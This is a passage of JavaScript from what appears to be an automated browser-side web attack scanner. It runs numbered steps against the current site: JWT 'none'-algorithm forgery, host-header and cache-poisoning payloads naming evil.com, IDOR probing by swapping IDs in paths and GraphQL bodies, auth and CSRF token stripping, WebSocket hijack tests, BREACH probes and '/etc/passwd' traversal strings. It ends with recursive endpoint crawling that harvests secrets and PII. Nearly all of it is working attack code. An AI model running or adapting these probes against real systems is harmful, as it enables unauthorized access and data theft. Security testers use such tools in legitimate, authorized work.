      var testUrl2=location.origin+ctx.apiPaths[0];
      var origResp2=await sf(testUrl2,{headers:{"Authorization":"Bearer "+jwtTokens[0].value}},1000);
      var noneResp=await sf(testUrl2,{headers:{"Authorization":"Bearer "+noneToken}},1000);
      R.jwtAlgResults.push({endpoint:ctx.apiPaths[0],originalAlg:origAlg,testedAlg:"none",originalStatus:origResp2.status,noneStatus:noneResp.status,accepted:noneResp.status===200,severity:noneResp.status===200?"critical":"info"});
    }catch(e){R.errors.push("JWT alg: "+e.message);}
  }
}

R.errors.push("STEP 18: Host Header Injection");
R.hostHeaderResults=[];
var hhPayloads=["evil.com","localhost","127.0.0.1"];
for(var hhi=0;hhi<hhPayloads.length;hhi++){
  try{
    var hhResp=await sf(location.origin+"/",{headers:{"X-Forwarded-Host":hhPayloads[hhi],"X-Host":hhPayloads[hhi]}},5000);
    if(hhResp.body&&hhResp.body.indexOf(hhPayloads[hhi])>-1){R.hostHeaderResults.push({payload:hhPayloads[hhi],reflected:true,status:hhResp.status,severity:"high"});}
  }catch(e){}
}

R.errors.push("STEP 19: Cache Poisoning");
R.cachePoisonResults=[];
var cpHeaders={"X-Forwarded-Scheme":"nothttps","X-Original-URL":"/admin","X-Rewrite-URL":"/admin","X-Forwarded-Port":"1234"};
var cpBase=await sf(location.origin+"/",{},3000);
for(var cpKey in cpHeaders){
  try{
    var cpHdrs={};cpHdrs[cpKey]=cpHeaders[cpKey];
    var cpResp=await sf(location.origin+"/",{headers:cpHdrs},3000);
    if(cpResp.body&&cpResp.body!==cpBase.body){
      var valAppears=cpResp.body.indexOf(cpHeaders[cpKey])>-1;
      if(valAppears||cpResp.status!==cpBase.status){R.cachePoisonResults.push({header:cpKey,value:cpHeaders[cpKey],reflected:valAppears,severity:valAppears?"high":"medium"});}
    }
  }catch(e){}
}

R.errors.push("STEP 20: IDOR Auto-Test");
// === 20. IDOR AUTO-TESTER (URL paths + GraphQL body IDs + cross-origin) ===
R.idorAutoResults=[];
if(ctx.aggroLevel!=="careful"){
  // A) URL path-based IDORs (original logic)
  var idorPathEps=ctx.pathParams.slice(0,20);
  for(var idi=0;idi<idorPathEps.length;idi++){
    var idEp=idorPathEps[idi];
    var idSegments=idEp.path.split("/");
    var origId=idSegments[idEp.paramIndex];
    if(!origId)continue;
    var testIds=[];
    if(idEp.type==="numeric-id"){var num=parseInt(origId);if(!isNaN(num)){testIds.push(""+(num+1));testIds.push(""+(num-1));if(num>100)testIds.push("1");}}
    else if(idEp.type==="uuid"){testIds.push(origId.substring(0,origId.length-1)+(origId.charAt(origId.length-1)==="0"?"1":"0"));testIds.push("00000000-0000-0000-0000-000000000000");}
    try{
      var idOrigResp=await sf(location.origin+idEp.path,{},5000);
      if(idOrigResp.status!==200)continue;
      for(var idj=0;idj<testIds.length;idj++){
        var modSegs=idSegments.slice();modSegs[idEp.paramIndex]=testIds[idj];
        var modResp=await sf(location.origin+modSegs.join("/"),{},5000);
        if(modResp.status===200&&modResp.body.length>10&&modResp.body!==idOrigResp.body){
          var skeleton=Math.abs(modResp.body.length-idOrigResp.body.length)<idOrigResp.body.length*0.5;
          R.idorAutoResults.push({path:idEp.path,paramType:idEp.type,originalId:origId,testedId:testIds[idj],originalStatus:200,testedStatus:200,originalSize:idOrigResp.body.length,testedSize:modResp.body.length,bodyDiffers:true,sameSkeleton:skeleton,severity:skeleton?"critical":"high",originalPreview:idOrigResp.body.substring(0,200),testedPreview:modResp.body.substring(0,200)});
          break;
        }
      }
    }catch(e){}
    if(idi%3===2)await delay(200);
  }
  // B) GraphQL / POST body IDORs — find ANY UUID or numeric ID in variables/body
  // Prioritize GraphQL endpoints, then other POST bodies
  var idorBodyEps=[];
  var idorBodySeen=new Set();
  ctx.postBodiesCtx.forEach(function(p){
    if(!p.body||p.body.length<5)return;
    var pUrl=p.url||(location.origin+p.path);
    var key=pUrl.substring(0,150);
    if(idorBodySeen.has(key))return;idorBodySeen.add(key);
    var isGql=p.path.indexOf("graphql")>-1||p.path.indexOf("gql")>-1||(p.body.indexOf('"query"')>-1&&p.body.indexOf('"variables"')>-1);
    idorBodyEps.push({url:pUrl,path:p.path,method:p.method,contentType:p.contentType,body:p.body,isGraphQL:isGql});
  });
  // Sort: GraphQL first (most likely to have IDOR)
  idorBodyEps.sort(function(a,b){return(b.isGraphQL?1:0)-(a.isGraphQL?1:0);});
  idorBodyEps=idorBodyEps.slice(0,25);
  R.errors.push("IDOR body scan: "+idorBodyEps.length+" POST bodies ("+idorBodyEps.filter(function(e){return e.isGraphQL;}).length+" GraphQL)");
  for(var idb=0;idb<idorBodyEps.length;idb++){
    var bEp=idorBodyEps[idb];
    try{
      var bBody=JSON.parse(bEp.body);
      // Find ALL UUIDs and numeric IDs in the body — don't filter by field name
      var idFields=[];
      function findIds(obj,prefix,depth){
        if(!obj||typeof obj!=="object"||depth>5)return;
        for(var k in obj){
          var v=obj[k];
          if(typeof v==="string"&&v.length>=2){
            // UUID pattern: 8-4-4-4-12 hex
            if(v.length>=32&&v.length<=40&&v.indexOf("-")>-1&&v.split("-").length===5){
              idFields.push({key:prefix+k,value:v,type:"uuid"});
            }
            // Numeric ID: pure digits, 2-15 chars
            else if(v.length>=2&&v.length<=15){
              var allDigits=true;for(var ci3=0;ci3<v.length;ci3++){var cc=v.charCodeAt(ci3);if(cc<48||cc>57){allDigits=false;break;}}
              if(allDigits)idFields.push({key:prefix+k,value:v,type:"numeric"});
            }
          }else if(typeof v==="number"&&v>0&&v<9999999999){
            idFields.push({key:prefix+k,value:""+v,type:"numeric"});
          }else if(typeof v==="object"&&v!==null&&!Array.isArray(v)){
            findIds(v,prefix+k+".",depth+1);
          }
        }
      }
      // For GraphQL: scan variables specifically
      if(bBody.variables&&typeof bBody.variables==="object"){
        findIds(bBody.variables,"variables.",0);
      }
      // Also scan top-level body
      findIds(bBody,"",0);
      // Deduplicate and prioritize: UUIDs first, then numeric
      idFields.sort(function(a,b){return(a.type==="uuid"?0:1)-(b.type==="uuid"?0:1);});
      var testedKeys=new Set();
      for(var idf=0;idf<idFields.length&&idf<5;idf++){
        var field=idFields[idf];
        if(testedKeys.has(field.value))continue;testedKeys.add(field.value);
        var modBody=JSON.parse(bEp.body);
        // Navigate to nested field and modify
        var keys=field.key.split(".");
        var target=modBody;
        for(var ki=0;ki<keys.length-1;ki++){if(target&&target[keys[ki]])target=target[keys[ki]];else{target=null;break;}}
        if(!target)continue;
        var lastKey=keys[keys.length-1];
        if(field.type==="numeric"){var nv=parseInt(field.value);target[lastKey]=isNaN(nv)?"1":""+(nv+1);}
        else{target[lastKey]=field.value.substring(0,field.value.length-1)+(field.value.charAt(field.value.length-1)==="0"?"1":"0");}
        var origResp3=await sf(bEp.url,{method:"POST",headers:{"Content-Type":bEp.contentType||"application/json"},body:bEp.body,credentials:"include"},5000);
        var modResp3=await sf(bEp.url,{method:"POST",headers:{"Content-Type":bEp.contentType||"application/json"},body:JSON.stringify(modBody),credentials:"include"},5000);
        if(origResp3.status===200&&modResp3.status===200&&modResp3.body!==origResp3.body&&modResp3.body.length>10){
          var skel3=Math.abs(modResp3.body.length-origResp3.body.length)<origResp3.body.length*0.5;
          var queryName="";
          if(bBody.query){var qm=bBody.query.indexOf("{");if(qm>-1){var qs=bBody.query.substring(0,qm).trim();var qw=qs.split(" ");queryName=qw.length>1?qw[qw.length-1]:qs;}}
          R.idorAutoResults.push({path:bEp.path+(queryName?" ("+queryName+")":""),paramType:"body-"+field.type+(bEp.isGraphQL?" [GraphQL]":""),originalId:field.value,testedId:""+target[lastKey],fieldName:field.key,originalStatus:200,testedStatus:200,originalSize:origResp3.body.length,testedSize:modResp3.body.length,bodyDiffers:true,sameSkeleton:skel3,severity:skel3?"critical":"high",originalPreview:origResp3.body.substring(0,200),testedPreview:modResp3.body.substring(0,200)});
          break;
        }
      }
    }catch(e){}
    if(idb%3===2)await delay(200);
  }
  R.errors.push("IDOR: tested "+idorPathEps.length+" path params + "+idorBodyEps.length+" body params, found "+R.idorAutoResults.filter(function(r){return r.severity!=="info";}).length+" issues");
}

R.errors.push("STEP 21: Auth Token Removal");
// === 21. AUTH TOKEN REMOVAL TEST (same-origin + cross-origin + GraphQL) ===
R.authRemovalResults=[];
if(ctx.aggroLevel!=="careful"){
  // Collect ALL authenticated endpoints — full URLs, not just paths
  var authEndpoints=[];
  var authSeen2=new Set();
  // From captured auth headers (includes cross-origin requests with Bearer tokens)
  ctx.authHeaders.forEach(function(h){
    if(!h.url)return;
    var key=(h.method||"GET")+":"+h.url.substring(0,150);
    if(!authSeen2.has(key)){authSeen2.add(key);authEndpoints.push({fullUrl:h.url,method:h.method||"GET",headers:h.headers,source:"authHeader"});}
  });
  // From POST bodies (includes GraphQL endpoints on any origin)
  ctx.postBodiesCtx.forEach(function(p){
    var pUrl=p.url||(location.origin+p.path);
    var key=p.method+":"+pUrl.substring(0,150);
    if(!authSeen2.has(key)){authSeen2.add(key);authEndpoints.push({fullUrl:pUrl,method:p.method||"POST",body:p.body,contentType:p.contentType,source:"postBody"});}
  });
  // From all observed endpoints (includes non-/api/ endpoints)
  ctx.allEndpoints.forEach(function(e){
    var eUrl=e.url||(location.origin+e.path);
    var key=e.method+":"+eUrl.substring(0,150);
    if(!authSeen2.has(key)){authSeen2.add(key);authEndpoints.push({fullUrl:eUrl,method:e.method||"GET",source:"endpoint"});}
  });
  authEndpoints=authEndpoints.slice(0,50);
  R.errors.push("Auth Removal: testing "+authEndpoints.length+" endpoints ("+authEndpoints.filter(function(e){return e.fullUrl.indexOf(location.origin)!==0;}).length+" cross-origin)");
  for(var ari=0;ari<authEndpoints.length;ari++){
    var arEp=authEndpoints[ari];
    var arOpts={method:arEp.method||"GET"};
    if(arEp.body){arOpts.body=arEp.body;arOpts.headers={"Content-Type":arEp.contentType||"application/json"};}
    try{
      // Request WITH credentials
      var arAuthOpts=JSON.parse(JSON.stringify(arOpts));arAuthOpts.credentials="include";
      var arAuthResp=await sf(arEp.fullUrl,arAuthOpts,5000);
      // Request WITHOUT credentials
      var arNoAuthOpts=JSON.parse(JSON.stringify(arOpts));arNoAuthOpts.credentials="omit";
      var arNoAuthResp=await sf(arEp.fullUrl,arNoAuthOpts,5000);
      var authOk=arAuthResp.status>=200&&arAuthResp.status<300;
      var noAuthOk=arNoAuthResp.status>=200&&arNoAuthResp.status<300;
      var displayPath=arEp.fullUrl.indexOf(location.origin)===0?arEp.fullUrl.substring(location.origin.length):arEp.fullUrl;
      if(authOk&&noAuthOk){
        var sameBody=arAuthResp.body===arNoAuthResp.body;
        var sameSize=Math.abs(arAuthResp.body.length-arNoAuthResp.body.length)<50;
        if(sameBody||sameSize){
          R.authRemovalResults.push({path:displayPath,fullUrl:arEp.fullUrl,method:arEp.method||"GET",authStatus:arAuthResp.status,noAuthStatus:arNoAuthResp.status,authSize:arAuthResp.body.length,noAuthSize:arNoAuthResp.body.length,sameBody:sameBody,severity:"critical",note:"Returns same data without authentication"});
        }else{
          R.authRemovalResults.push({path:displayPath,fullUrl:arEp.fullUrl,method:arEp.method||"GET",authStatus:arAuthResp.status,noAuthStatus:arNoAuthResp.status,authSize:arAuthResp.body.length,noAuthSize:arNoAuthResp.body.length,sameBody:false,severity:"high",note:"200 without auth but different data"});
        }
      }else if(authOk&&!noAuthOk){
        R.authRemovalResults.push({path:displayPath,fullUrl:arEp.fullUrl,method:arEp.method||"GET",authStatus:arAuthResp.status,noAuthStatus:arNoAuthResp.status,severity:"info",note:"Properly requires auth ("+arNoAuthResp.status+")"});
      }
    }catch(e){}
    if(ari%5===4)await delay(150);
  }
}

R.errors.push("STEP 22: CSRF Validation");
// === 22. CSRF TOKEN VALIDATION TEST (same-origin + cross-origin + GraphQL) ===
R.csrfResults=[];
if(ctx.aggroLevel!=="careful"){
  // Collect all state-changing requests — GraphQL mutations + POST/PUT/DELETE
  var csrfEndpoints=[];
  var csrfSeen=new Set();
  var gqlMutationCount=0;
  ctx.postBodiesCtx.forEach(function(p){
    var pUrl=p.url||(location.origin+p.path);
    var key=pUrl.substring(0,150);
    if(csrfSeen.has(key))return;
    // Check if this is a GraphQL mutation
    var isGqlMutation=false;
    if(p.body&&p.body.indexOf('"query"')>-1){
      try{
        var gqlBody=JSON.parse(p.body);
        var q=(gqlBody.query||"").trim();
        if(q.indexOf("mutation")===0||q.indexOf("mutation ")>-1){isGqlMutation=true;gqlMutationCount++;}
      }catch(e){}
    }
    // Include: all GraphQL mutations, all POST/PUT/DELETE
    if(isGqlMutation||p.method==="POST"||p.method==="PUT"||p.method==="DELETE"){
      csrfSeen.add(key);
      csrfEndpoints.push({fullUrl:pUrl,path:p.path,method:p.method,contentType:p.contentType,body:p.body||"{}",isGraphQLMutation:isGqlMutation});
    }
  });
  // Add observed POST/PUT/DELETE endpoints not already seen
  ctx.allEndpoints.filter(function(e){return e.method==="POST"||e.method==="PUT"||e.method==="DELETE";}).forEach(function(e){
    var eUrl=e.url||(location.origin+e.path);
    var key=eUrl.substring(0,150);
    if(!csrfSeen.has(key)){csrfSeen.add(key);csrfEndpoints.push({fullUrl:eUrl,path:e.path,method:e.method,contentType:"application/json",body:"{}",isGraphQLMutation:false});}
  });
  // Sort: GraphQL mutations first (most interesting for CSRF)
  csrfEndpoints.sort(function(a,b){return(b.isGraphQLMutation?1:0)-(a.isGraphQLMutation?1:0);});
  csrfEndpoints=csrfEndpoints.slice(0,30);
  R.errors.push("CSRF: testing "+csrfEndpoints.length+" state-changing endpoints ("+gqlMutationCount+" GraphQL mutations)");
  var csrfTokenNames=["csrf","_token","csrfmiddlewaretoken","authenticity_token","__RequestVerificationToken","XSRF-TOKEN","_csrf","antiforgery","csrfToken","csrf_token"];
  for(var csi=0;csi<csrfEndpoints.length;csi++){
    var csEp=csrfEndpoints[csi];
    var csBody=csEp.body||"{}";
    var csCT=csEp.contentType||"application/json";
    var hasCSRF=false;var csrfFieldName="";
    csrfTokenNames.forEach(function(tn){if(csBody.toLowerCase().indexOf(tn.toLowerCase())>-1){hasCSRF=true;csrfFieldName=tn;}});
    var displayPath=csEp.fullUrl.indexOf(location.origin)===0?csEp.path:csEp.fullUrl;
    try{
      var csNormalResp=await sf(csEp.fullUrl,{method:csEp.method||"POST",headers:{"Content-Type":csCT},body:csBody,credentials:"include"},3000);
      var csStrippedBody=csBody;
      if(hasCSRF&&csCT.indexOf("json")>-1){try{var csObj=JSON.parse(csBody);csrfTokenNames.forEach(function(tn){delete csObj[tn];delete csObj["_"+tn];});csStrippedBody=JSON.stringify(csObj);}catch(e){}}
      var csNoCSRFResp=await sf(csEp.fullUrl,{method:csEp.method||"POST",headers:{"Content-Type":csCT},body:csStrippedBody,credentials:"include"},3000);
      var csNoCookieResp=await sf(csEp.fullUrl,{method:csEp.method||"POST",headers:{"Content-Type":csCT},body:csBody,credentials:"omit"},3000);
      var normalOk=csNormalResp.status>=200&&csNormalResp.status<400;
      var noCSRFOk=csNoCSRFResp.status>=200&&csNoCSRFResp.status<400;
      var noCookieOk=csNoCookieResp.status>=200&&csNoCookieResp.status<400;
      var severity="info";var note="";
      if(!hasCSRF&&normalOk){severity="high";note="No CSRF token in request";}
      else if(hasCSRF&&noCSRFOk&&normalOk){severity="critical";note="CSRF token not validated";}
      else if(hasCSRF&&!noCSRFOk){severity="info";note="CSRF properly validated";}
      if(noCookieOk&&normalOk){severity=severity==="critical"?"critical":"high";note=(note?note+"; ":"")+"Works without cookies";}
      R.csrfResults.push({path:displayPath,fullUrl:csEp.fullUrl,method:csEp.method||"POST",hasCSRF:hasCSRF,csrfField:csrfFieldName,normalStatus:csNormalResp.status,noCSRFStatus:csNoCSRFResp.status,noCookieStatus:csNoCookieResp.status,severity:severity,note:note,isGraphQLMutation:csEp.isGraphQLMutation||false});
    }catch(e){R.errors.push("CSRF "+csEp.path+": "+e.message);}
    if(csi%3===2)await delay(200);
  }
}

// ===== STEP 23: gRPC Reflection =====
R.errors.push("STEP 23: gRPC Reflection");
if(ctx.aggroLevel!=="careful"){
  var grpcPaths=ctx.grpcEndpoints||[];
  var grpcBasePaths=new Set();
  grpcPaths.forEach(function(g){
    if(g.path){var li=g.path.lastIndexOf("/");grpcBasePaths.add(li>0?g.path.substring(0,li):g.path);}
  });
  if(!grpcBasePaths.size){
    var possibleGrpcBases=["/grpc","/api"];
    ctx.apiPaths.forEach(function(p){if(p.toLowerCase().indexOf("/grpc")>-1)possibleGrpcBases.push(p);});
    possibleGrpcBases.forEach(function(b){grpcBasePaths.add(b);});
  }
  for(var grpcBase of grpcBasePaths){
    try{
      var reflectUrl=location.origin+grpcBase+"/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo";
      var grpcResp=await sf(reflectUrl,{method:"POST",headers:{"Content-Type":"application/grpc-web+proto","Accept":"application/grpc-web+proto"}});
      if(grpcResp.status<400&&grpcResp.body.length>10){
        R.grpcReflection={url:reflectUrl,status:grpcResp.status,bodyPreview:grpcResp.body.substring(0,500),services:[],type:"reflection-enabled"};
        break;
      }
      var grpcV1=location.origin+grpcBase+"/grpc.reflection.v1.ServerReflection/ServerReflectionInfo";
      var grpcV1Resp=await sf(grpcV1,{method:"POST",headers:{"Content-Type":"application/grpc-web+proto"}});
      if(grpcV1Resp.status<400&&grpcV1Resp.body.length>10){
        R.grpcReflection={url:grpcV1,status:grpcV1Resp.status,bodyPreview:grpcV1Resp.body.substring(0,500),services:[],type:"reflection-v1"};
        break;
      }
    }catch(e){R.errors.push("gRPC reflect "+grpcBase+": "+e.message);}
  }
  if(!R.grpcReflection){
    var grpcWebPaths=["/grpc.health.v1.Health/Check","/grpc.health.v1.Health/Watch"];
    for(var ghp of grpcWebPaths){
      try{
        var ghResp=await sf(location.origin+ghp,{method:"POST",headers:{"Content-Type":"application/grpc-web+proto"}});
        if(ghResp.status<400){
          R.grpcReflection={url:location.origin+ghp,status:ghResp.status,bodyPreview:ghResp.body.substring(0,200),type:"health-check-exposed"};
          break;
        }
      }catch(e){}
    }
  }
}

// ===== STEP 24: Compression Oracle (BREACH) =====
R.errors.push("STEP 24: Compression Oracle");
if(ctx.aggroLevel==="full"){
  R.compressionResults=[];
  var compTargets=ctx.stateChangingPosts||[];
  if(!compTargets.length){
    compTargets=ctx.observedApis.filter(function(a){return a.method==="GET";}).slice(0,5).map(function(a){return{url:location.origin+a.path,path:a.path};});
  }
  for(var ci2=0;ci2<Math.min(compTargets.length,8);ci2++){
    var compEp=compTargets[ci2];
    try{
      var baseResp=await sf(compEp.url||location.origin+compEp.path,{headers:{"Accept-Encoding":"gzip, deflate, br"}},5000);
      var noCompResp=await sf(compEp.url||location.origin+compEp.path,{headers:{"Accept-Encoding":"identity"}},5000);
      var compDelta=Math.abs(baseResp.size-noCompResp.size);
      var compRatio=baseResp.size>0?noCompResp.size/baseResp.size:0;
      if(compRatio>1.2||compDelta>200){
        var probeResults=[];
        var knownToken="AAAAAAAAAA";
        var testPayloads=["session="+knownToken,"csrf_token="+knownToken,"Bearer "+knownToken];
        for(var tp of testPayloads){
          try{
            var withPayload=await sf((compEp.url||location.origin+compEp.path)+(compEp.path.includes("?")?"&":"?")+"_ps="+encodeURIComponent(tp),{headers:{"Accept-Encoding":"gzip, deflate, br"}},5000);
            var withRandom=await sf((compEp.url||location.origin+compEp.path)+(compEp.path.includes("?")?"&":"?")+"_ps="+encodeURIComponent("ZZZZZZZZZZ"),{headers:{"Accept-Encoding":"gzip, deflate, br"}},5000);
            if(withPayload.size!==withRandom.size){
              probeResults.push({payload:tp,payloadSize:withPayload.size,randomSize:withRandom.size,delta:Math.abs(withPayload.size-withRandom.size)});
            }
          }catch(e){}
        }
        R.compressionResults.push({path:compEp.path,compressedSize:baseResp.size,uncompressedSize:noCompResp.size,ratio:compRatio.toFixed(2),compressionActive:true,probeResults:probeResults,severity:probeResults.length>0?"high":"info",note:probeResults.length>0?"Compression oracle detected — response size varies with injected content (BREACH candidate)":"Compression active but no oracle detected"});
      }else{
        R.compressionResults.push({path:compEp.path,compressedSize:baseResp.size,uncompressedSize:noCompResp.size,ratio:compRatio.toFixed(2),compressionActive:false,severity:"info",note:"No significant compression difference"});
      }
    }catch(e){R.errors.push("Compression "+compEp.path+": "+e.message);}
  }
}

R.errors.push("STEP 25: WebSocket Hijack Test");
if(ctx.aggroLevel!=="careful"){
  var wsEndpoints=[];
  try{
    var perfEntries=performance.getEntries();
    perfEntries.forEach(function(e){if(e.name&&(e.name.startsWith("ws://")||e.name.startsWith("wss://")))wsEndpoints.push(e.name);});
  }catch(e){}
  if(!wsEndpoints.length){
    var possibleWsPaths=["/ws","/websocket","/socket.io/?EIO=4&transport=websocket","/sockjs/info","/cable","/hub","/signalr/negotiate","/realtime"];
    possibleWsPaths.forEach(function(p){
      var proto=location.protocol==="https:"?"wss:":"ws:";
      wsEndpoints.push(proto+"//"+location.host+p);
    });
  }
  for(var wsi=0;wsi<Math.min(wsEndpoints.length,8);wsi++){
    try{
      var wsUrl=wsEndpoints[wsi];
      var httpUrl=wsUrl.replace(/^wss?:/,location.protocol);
      var upgradeResp=await sf(httpUrl,{headers:{"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Version":"13","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Origin":"https://evil.com"}});
      var crossOriginAllowed=upgradeResp.status===101||upgradeResp.status===200;
      var noOriginResp=await sf(httpUrl,{headers:{"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Version":"13","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ=="}});
      R.wsHijackResults.push({url:wsUrl,crossOriginStatus:upgradeResp.status,noOriginStatus:noOriginResp.status,crossOriginAllowed:crossOriginAllowed,severity:crossOriginAllowed?"high":"info",note:crossOriginAllowed?"WebSocket accepts cross-origin connections from evil.com":"Origin validation appears enforced"});
    }catch(e){R.errors.push("WS hijack "+wsEndpoints[wsi]+": "+e.message);}
  }
}

R.errors.push("STEP 26: Active Cache Poisoning");
if(ctx.aggroLevel==="full"){
  var cacheTargets=ctx.observedApis.filter(function(a){return a.method==="GET";}).slice(0,5);
  for(var cpi=0;cpi<cacheTargets.length;cpi++){
    try{
      var cpUrl=location.origin+cacheTargets[cpi].path;
      var normalResp=await sf(cpUrl);
      var poisonHeaders=[
        {"X-Forwarded-Host":"evil.com","X-Forwarded-Scheme":"nothttps"},
        {"X-Original-URL":"/admin","X-Rewrite-URL":"/admin"},
        {"X-Forwarded-Port":"1337","X-Forwarded-Prefix":"/evil"}
      ];
      for(var phi=0;phi<poisonHeaders.length;phi++){
        var poisonResp=await sf(cpUrl,{headers:poisonHeaders[phi]});
        var cacheHeaders=["x-cache","cf-cache-status","x-varnish","age","x-cache-hits"];
        var isCached=false;
        cacheHeaders.forEach(function(ch){
          var hv=(poisonResp.ct||"").toLowerCase();
          if(poisonResp.body&&poisonResp.body.indexOf("evil")>-1)isCached=true;
        });
        var bodyDiff=normalResp.body!==poisonResp.body;
        var statusDiff=normalResp.status!==poisonResp.status;
        if(bodyDiff||statusDiff||isCached){
          R.cachePoisonProbe.push({url:cpUrl,path:cacheTargets[cpi].path,headers:poisonHeaders[phi],normalStatus:normalResp.status,poisonStatus:poisonResp.status,bodyDiff:bodyDiff,statusDiff:statusDiff,reflected:poisonResp.body.indexOf("evil")>-1,severity:poisonResp.body.indexOf("evil")>-1?"critical":bodyDiff?"high":"medium",note:poisonResp.body.indexOf("evil")>-1?"Poison payload reflected in response":"Response differs with cache poison headers"});
        }
      }
    }catch(e){R.errors.push("Cache poison "+cacheTargets[cpi].path+": "+e.message);}
  }
}

R.errors.push("STEP 27: Timing Oracle");
if(ctx.aggroLevel!=="careful"){
  var timingTargets=ctx.observedApis.filter(function(a){return a.path&&a.path.includes("/api/");}).slice(0,8);
  for(var ti=0;ti<timingTargets.length;ti++){
    try{
      var tUrl=location.origin+timingTargets[ti].path;
      var timings=[];
      for(var tr=0;tr<3;tr++){
        var t0=performance.now();
        await sf(tUrl,null,1000);
        timings.push(Math.round(performance.now()-t0));
      }
      var baseline=timings.reduce(function(a,b){return a+b;},0)/timings.length;
      var lfiPayloads=["....//....//....//etc/passwd","..%252f..%252f..%252fetc/passwd"];
      var lfiTimings=[];
      for(var li=0;li<lfiPayloads.length;li++){
        var lfiUrl=tUrl+(tUrl.includes("?")?"&":"?")+"file="+encodeURIComponent(lfiPayloads[li]);
        var lt0=performance.now();
        await sf(lfiUrl,null,1000);
        lfiTimings.push({payload:lfiPayloads[li],time:Math.round(performance.now()-lt0)});
      }
      var maxDelta=0;
      lfiTimings.forEach(function(lt){
        var delta=Math.abs(lt.time-baseline);
        if(delta>maxDelta)maxDelta=delta;
      });
      if(maxDelta>100||baseline>500){
        R.timingOracle.push({path:timingTargets[ti].path,baselineMs:Math.round(baseline),lfiTimings:lfiTimings,maxDelta:maxDelta,severity:maxDelta>500?"high":maxDelta>200?"medium":"info",note:maxDelta>200?"Significant timing difference with path traversal payloads":"Timing captured for analysis"});
      }
    }catch(e){R.errors.push("Timing "+timingTargets[ti].path+": "+e.message);}
  }
}

R.errors.push("STEP 28: COOP/COEP Bypass");
if(ctx.aggroLevel!=="careful"){
  try{
    var isCrossOriginIsolated=self.crossOriginIsolated||false;
    var coopResp=await sf(location.origin+"/",{headers:{"Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"cross-site"}});
    var coopHeader="";var coepHeader="";
    R.coopCoepBypass.push({crossOriginIsolated:isCrossOriginIsolated,coopHeader:coopHeader,coepHeader:coepHeader,status:coopResp.status,severity:!isCrossOriginIsolated?"medium":"info",note:!isCrossOriginIsolated?"Site is NOT cross-origin isolated \u2014 vulnerable to Spectre-class side-channel attacks. Storage partitioning may not apply.":"Site is cross-origin isolated"});
    if(!isCrossOriginIsolated){
      var popupTestPaths=["/","/login","/api/me","/account"];
      for(var pti=0;pti<Math.min(popupTestPaths.length,3);pti++){
        try{
          var ptResp=await sf(location.origin+popupTestPaths[pti],{headers:{"Sec-Fetch-Dest":"iframe","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"cross-site"}});
          if(ptResp.ok){
            R.coopCoepBypass.push({type:"iframe-embed",path:popupTestPaths[pti],status:ptResp.status,frameable:true,severity:"medium",note:"Page can be framed cross-origin \u2014 clickjacking + timing side-channel"});
          }
        }catch(e){}
      }
    }
  }catch(e){R.errors.push("COOP/COEP: "+e.message);}
}

// ===== STEP 30: Smart Recursive API Discovery =====
// v5.7: The killer feature. Collects every endpoint discovered in steps 1-29 (swagger paths,
// source map endpoints, graphql introspection query fields, suffix brute hits, route definitions)
// and actually PROBES them with GET requests. For each response that looks like JSON, we extract
// new URLs from the body and feed them into the next wave. Three waves total. Findings inside
// those responses get scanned for secrets, tokens, PII, and internal URLs and bubble up to the
// main Secrets tab. Rate-limited and budget-capped to avoid hammering targets.
R.errors.push("STEP 30: Recursive API Discovery");
R.recursiveProbe={wave1:[],wave2:[],wave3:[],totalDiscovered:0,newUrlsFound:0,seedCount:0,skippedCount:0};
if(ctx.recursive!==false){
  var probedInRecursive={};
  var observedPaths={};
  (ctx.observedApis||[]).forEach(function(e){observedPaths[e.path]=1;});
  (ctx.allEndpoints||[]).forEach(function(e){observedPaths[e.path]=1;});
  // Regex patterns injected via ctx._re (defined in module scope, serialized through JSON)
  // so backslashes survive the template-literal → eval → string-parser → RegExp chain intact.
  var staticAssetRe=new RegExp(ctx._re.staticAsset.src,ctx._re.staticAsset.f);
  var destructiveRe=new RegExp(ctx._re.destructive.src,ctx._re.destructive.f);
  var templateRe=new RegExp(ctx._re.template.src,ctx._re.template.f);
  function shouldProbe(path){
    if(!path||typeof path!=="string"||path.length<3||path.length>250)return false;
    if(path.charAt(0)!=="/")return false;
    if(observedPaths[path])return false;
    if(staticAssetRe.test(path))return false;
    if(templateRe.test(path))return false;
    if(path.indexOf(":")>0&&path.indexOf("://")===-1){
      var stripped=path.split("?")[0];
      var segs=stripped.split("/");
      for(var si=0;si<segs.length;si++){if(segs[si].charAt(0)===":"&&segs[si].length>1)return false;}
    }
    if(destructiveRe.test(path)&&ctx.aggroLevel!=="full")return false;
    return true;
  }
  async function recursiveHit(path,wave){
    if(probedInRecursive[path])return null;
    probedInRecursive[path]=1;
    var fullUrl=path.indexOf("://")>-1?path:(location.origin+(path.charAt(0)==="/"?path:"/"+path));
    try{
      var resp=await sf(fullUrl,{method:"GET"},200000);
      if(resp.status===0)return null;
      var newUrls=[];
      var findings=[];
      if(resp.body&&resp.body.length>20){
        var ctLower=(resp.ct||"").toLowerCase();
        var looksJson=ctLower.indexOf("json")>-1||resp.body.charAt(0)==="{"||resp.body.charAt(0)==="[";
        var looksText=ctLower.indexOf("text")>-1||ctLower.indexOf("html")>-1||ctLower.indexOf("xml")>-1||looksJson;
        if(looksText){
          newUrls=extractUrlsFromBody(resp.body);
          findings=scanBodyForFindings(resp.body);
        }
      }
      return{
        path:path,
        url:fullUrl,
        status:resp.status,
        size:resp.size||resp.body.length,
        contentType:resp.ct,
        bodyPreview:resp.body.substring(0,600),
        newUrls:newUrls,
        findings:findings,
        wave:wave
      };
    }catch(e){return null;}
  }
  // === SEED: collect every known unobserved API path from prior steps ===
  var seedUrls={};
  function addSeed(path,origin){
    if(!shouldProbe(path))return;
    if(!seedUrls[path])seedUrls[path]=origin||"unknown";
  }
  // From swagger
  (R.swagger||[]).forEach(function(sw){
    var basePath=sw.basePath||"";
    (sw.paths||[]).forEach(function(p){
      if(p.path&&p.path.charAt(0)==="/"){
        var hasParams=/\{[^}]+\}/.test(p.path);
        if(!hasParams)addSeed(basePath+p.path,"swagger");
      }
    });
  });
  // From source maps
  (R.sourceMaps||[]).forEach(function(sm){
